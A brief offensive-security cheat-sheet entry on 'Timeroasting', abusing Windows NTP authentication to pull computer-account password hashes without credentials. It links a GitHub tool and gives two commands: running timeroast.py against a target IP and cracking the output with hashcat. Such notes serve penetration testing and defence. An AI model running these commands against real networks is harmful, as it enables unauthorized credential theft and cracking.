# Timeroasting

### Timeroasting takes advantage of Windows' NTP authentication mechanism, allowing unauthenticated attackers to effectively request a password hash of any computer account by sending an NTP request with that account's RID

## Github repo: https://github.com/SecuraBV/Timeroast

### Steps:

    sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt

    hashcat -m 31300 ntp-hashes.txt
